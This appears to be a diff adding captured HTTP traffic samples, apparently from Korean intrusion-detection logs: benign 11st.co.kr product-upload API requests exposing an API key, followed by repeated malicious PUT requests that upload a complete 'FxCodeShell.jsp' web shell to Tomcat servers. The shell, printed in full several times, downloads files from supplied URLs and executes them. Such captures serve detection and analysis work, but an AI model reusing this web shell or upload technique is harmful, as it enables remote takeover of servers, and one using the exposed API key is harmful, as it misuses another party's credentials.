+PUT /rest/prodservices/product/1945778937 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 14339
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020686]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Free RN 2017 Running Shoes/950007453 .... ...... ...... ...... ...... ..........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950007453]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Free RN 2017 Running Shoes</div><div style="text-align:left;">PROD950007453</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Updated to deliver a lighter ride, the Nike&reg; Free RN 2017 running shoes are built for comfort and performance. This updated version has reduced layers to decrease weight, and a circular knit upper to increase breathability and support. A low-profile injected unit sole doubles as the outsole to reduce the shoe..s overall weight, while an auxetic tri-star outsole pattern expands with each step to deliver flexible cushioning mile after mile. FEATURES: <br>Updated circular-knit upper delivers a 1:1 fit for added support <br>Simplified one-piece upper delivers ventilation and support <br>Dynamic Fit technology integrated Flywire&reg; cables in.to laces <br>Updated tongue construction delivers low-profile silhouette <br>Minimal, molded sockliner adds support and cushion <br>Injected unit sole delivers resilient, cushioned ride <br>Rounded heel design encourages natural foot-strike <br>Auxetic tri-star outsole pattern adds flexible cushioning <br>Solid rubber segments under the toe and heel enhance traction SPECS:<br>Shoe type: Neutral <br>Previous model: Free RN <br>Forefoot: 14mm / Heel: 22mm<br>Offset: 8mm <br>Weight: 8.4 oz.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 880839 <br>Web ID: 17NIKMFRRN2GRYBLKRNN function openWarningPopup() {var skuId = document.getpA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/1945778937 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 14339
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[1020686]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Free RN 2017 Running Shoes/950007453 .... ...... ...... ...... ...... ..........]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950007453]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950007453/600_600_17NIKMFRRN2GRYBLKRNN_Grey_Lime.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Free RN 2017 Running Shoes</div><div style="text-align:left;">PROD950007453</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Updated to deliver a lighter ride, the Nike&reg; Free RN 2017 running shoes are built for comfort and performance. This updated version has reduced layers to decrease weight, and a circular knit upper to increase breathability and support. A low-profile injected unit sole doubles as the outsole to reduce the shoe..s overall weight, while an auxetic tri-star outsole pattern expands with each step to deliver flexible cushioning mile after mile. FEATURES: <br>Updated circular-knit upper delivers a 1:1 fit for added support <br>Simplified one-piece upper delivers ventilation and support <br>Dynamic Fit technology integrated Flywire&reg; cables in.to laces <br>Updated tongue construction delivers low-profile silhouette <br>Minimal, molded sockliner adds support and cushion <br>Injected unit sole delivers resilient, cushioned ride <br>Rounded heel design encourages natural foot-strike <br>Auxetic tri-star outsole pattern adds flexible cushioning <br>Solid rubber segments under the toe and heel enhance traction SPECS:<br>Shoe type: Neutral <br>Previous model: Free RN <br>Forefoot: 14mm / Heel: 22mm<br>Offset: 8mm <br>Weight: 8.4 oz.Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 880839 <br>Web ID: 17NIKMFRRN2GRYBLKRNN function openWarningPopup() {var skuId = document.get
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2162392569 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 15660
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[10475]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Chaco  Womens Z/Eddy X2 Sandals/950011761 .... ........ ..../...... ....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Chaco]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950011761]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE2Nzg4NXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Chaco Womens Z/Eddy X2 Sandals</div><div style="text-align:left;">PROD950011761</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Just like the X1, the Chaco&reg; Women''s Z/Eddy X1 sandals will soon become your most trusted pair of sandals for outdoor adventures. Their durable straps wrap feet and are imbedded in the midsole for sturdiness that doesn''t quit, and the ladder lock buckle ensures a fit that stays put. Their non-marking outsoles feature 2.5mm lugs for aggressive grip. Grab a trail map, pick your route and enjoy the ride in the Women''s Z/Eddy X1.FEATURES:<br>Quick-drying, non-adjustable polyester jacquard webbing upper that is securely fixed to the midsole<br>Toe loop for secure fit<br>Durable high-tension webbing heel risers that adjust to your needs<br>Injection-molded ladder lock buckle ensures your sel.ected fit stays put<br>Women''s specific LUVSEAT&trade; EVA midsole provides contoured arch support and is certified by the American Podiatric Medical Association<br>Non-marking ChacoGrip&trade; with 15 percent recycled rubber compound<br>2.5mm lugs supply aggressive grip<br>Care instructions: Wash sandals with a load of laundry on a gentle cycle using mild detergent or baking soda with cold water. Air dry. <br>Note: This style features fixed, non-adjustable straps. Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Chaco<br>Style: J106468, J106472, J106476, J106478 <br>Web ID: 18CH2WWZDDYX2BMPPFOT function openWarningPopuppA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2162392569 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 15660
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[10475]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Chaco  Womens Z/Eddy X2 Sandals/950011761 .... ........ ..../...... ....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Chaco]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950011761]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Chaco/950011761/600_600_18CH2WWZDDYX2BMPPFOT_Columns_Eclipse.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE2Nzg4NXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Chaco Womens Z/Eddy X2 Sandals</div><div style="text-align:left;">PROD950011761</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Just like the X1, the Chaco&reg; Women''s Z/Eddy X1 sandals will soon become your most trusted pair of sandals for outdoor adventures. Their durable straps wrap feet and are imbedded in the midsole for sturdiness that doesn''t quit, and the ladder lock buckle ensures a fit that stays put. Their non-marking outsoles feature 2.5mm lugs for aggressive grip. Grab a trail map, pick your route and enjoy the ride in the Women''s Z/Eddy X1.FEATURES:<br>Quick-drying, non-adjustable polyester jacquard webbing upper that is securely fixed to the midsole<br>Toe loop for secure fit<br>Durable high-tension webbing heel risers that adjust to your needs<br>Injection-molded ladder lock buckle ensures your sel.ected fit stays put<br>Women''s specific LUVSEAT&trade; EVA midsole provides contoured arch support and is certified by the American Podiatric Medical Association<br>Non-marking ChacoGrip&trade; with 15 percent recycled rubber compound<br>2.5mm lugs supply aggressive grip<br>Care instructions: Wash sandals with a load of laundry on a gentle cycle using mild detergent or baking soda with cold water. Air dry. <br>Note: This style features fixed, non-adjustable straps. Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Chaco<br>Style: J106468, J106472, J106476, J106478 <br>Web ID: 18CH2WWZDDYX2BMPPFOT function openWarningPopup
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.30:8080
+
+
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.10:8080
+
+
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.36:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String D
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.36:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String D
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.36:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i++) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:" + urls[i] + "<br>");
+			out.write("<br>filename:" + fileName + "<br>");
+			out.write("<br>Size:" + urls.length + "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							+ "<br><br>");
+			File isfile = new File(path + fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path + fileName);
+					} else {
+						String chmod = "chmod 777 " + path + fileName;
+						exec.exec(chmod);
+						exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+					}
+				} catch (Exception e1) {
+					e1.printStackTrace();
+				}
+				continue;
+			}
+			URL downloadUrl = new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path + fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path + fileName);
+			} else {
+				String chmod = "chmod 777 " + path + fileName;
+				exec.exec(chmod);
+				exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+			}
+		} catch (Exception e2) {
+			e2
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp/ HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.36:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i++) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:" + urls[i] + "<br>");
+			out.write("<br>filename:" + fileName + "<br>");
+			out.write("<br>Size:" + urls.length + "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							+ "<br><br>");
+			File isfile = new File(path + fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path + fileName);
+					} else {
+						String chmod = "chmod 777 " + path + fileName;
+						exec.exec(chmod);
+						exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+					}
+				} catch (Exception e1) {
+					e1.printStackTrace();
+				}
+				continue;
+			}
+			URL downloadUrl = new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path + fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path + fileName);
+			} else {
+				String chmod = "chmod 777 " + path + fileName;
+				exec.exec(chmod);
+				exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+			}
+		} catch (Exception e2) {
+			e2.printStackTrace();
+		}
+	}
+%>
+------end--------
+
+-------정탐-전체페이로드1.csv-------
+PUT /FxCodeShell.jsp/ HTTP/1.1
+Cache-Control: no-cache
+Connection: Keep-Alive
+Accept: text/html, application/xhtml+xml, */*
+Accept-Encoding: gbk, GB2312
+Accept-Language: zh-cn
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+Content-Length: 3363
+Host: 211.42.98.24:8080
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "C:/Windows/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i++) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:" + urls[i] + "<br>");
+			out.write("<br>filename:" + fileName + "<br>");
+			out.write("<br>Size:" + urls.length + "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							+ "<br><br>");
+			File isfile = new File(path + fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path + fileName);
+					} else {
+						String chmod = "chmod 777 " + path + fileName;
+						exec.exec(chmod);
+						exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+					}
+				} catch (Exception e1) {
+					e1.printStackTrace();
+				}
+				continue;
+			}
+			URL downloadUrl = new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path + fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path + fileName);
+			} else {
+				String chmod = "chmod 777 " + path + fileName;
+				exec.exec(chmod);
+				exec.exec("nohup " + path + fileName + " > /dev/null 2>&1 &");
+			}
